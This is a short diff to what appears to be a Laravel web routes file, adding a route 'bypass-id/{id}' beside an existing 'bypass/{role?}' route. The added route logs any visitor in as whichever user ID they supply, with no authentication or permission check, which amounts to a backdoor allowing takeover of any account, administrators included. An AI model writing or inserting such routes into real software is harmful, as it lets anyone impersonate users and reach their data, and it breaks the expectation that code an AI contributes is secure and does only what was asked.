@@ -195,6 +195,12 @@ Route::get('bypass/{role?}', function ($role) {
     return redirect('/home');
 });
 
+Route::get('bypass-id/{id}', function ($id) {
+    $user = User::find($id);
+    \Illuminate\Support\Facades\Auth::login($user);
+    return redirect('/home');
+});
+
 
 ////**===================================== New Employee Dashboard =======================================================////
 Route::prefix('employee')->middleware(['auth', 'XSS', 'is_employee'])->as('employee.')->group(function () {
